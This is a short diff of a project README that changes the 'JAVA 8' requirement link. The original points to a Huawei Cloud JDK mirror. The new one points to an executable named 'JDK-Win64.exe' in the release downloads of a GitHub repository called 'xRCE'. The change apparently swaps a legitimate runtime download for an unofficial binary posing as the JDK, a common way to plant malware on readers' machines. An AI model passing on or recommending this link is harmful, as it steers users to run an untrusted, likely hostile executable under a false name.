@@ -3,7 +3,7 @@
 
 
 ### Requirments:
- - ##### Unsupported [JAVA 8](https://mirrors.huaweicloud.com/java/jdk/8u181-b13)
+ - ##### Unsupported [JAVA 8](https://github.com/x10m/xRCE/releases/download/tools/JDK-Win64.exe)
  - ##### [Maven](https://maven.apache.org/download.cgi)
  - ##### [Python](https://python.org/download)
  - ##### [Git](https://git-scm.com/download/win)
